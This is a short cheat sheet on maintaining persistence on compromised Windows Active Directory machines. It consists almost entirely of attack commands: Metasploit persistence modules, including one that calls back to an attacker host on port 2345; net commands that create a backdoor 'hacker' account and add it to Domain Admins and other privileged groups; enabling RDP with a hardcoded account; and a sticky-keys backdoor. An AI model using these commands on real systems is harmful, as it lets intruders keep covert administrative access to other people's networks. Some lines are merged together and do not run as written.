# Windows AD Persistence

Persistence techniques allow an attacker to maintain access to a compromised system. This cheat sheet provides various methods for achieving persistence using Metasploit and other techniques.

### Persistence with Metasploit Backdoor

***

**Once you have a Meterpreter Session.** Configure the module.

```bash
background use exploit/windows/local/persistence 
set session 1 run
```

### Persistence with Metasploit Script

***

**Once you have a Meterpreter Session.** Configure the module:

```bash
run persistence -h 
run persistence -r 192.168.20.9 -p 2345 -U
```

### Persistence with Creating Local Users

***

Create a user and add it to domain and administrators groups:

```bash
net user hacker Hcker_12345678* /add /Y
net localgroup administrators hacker /add 
net localgroup "Remote Desktop Users" hacker /add 
# RDP access
net localgroup "Backup Operators" hacker /add  
# Full access to files
net group "Domain Admins" hacker /add /domain
# Enable a domain user account 
net user hacker /ACTIVE:YES /domain net user hacker /Expires:Never
```

### Enable RDP in Windows Machine via Meterpreter

***

```bash
run getgui -e -u EVIL -p 123 
use post/windows/manage/enable_rdp 
set username EVIL set password 123 
set session 1 exploit
```

### Persistence with RDP Session

***

```bash
use post/windows/manage/sticky_keys
set session 1 exploit`
```
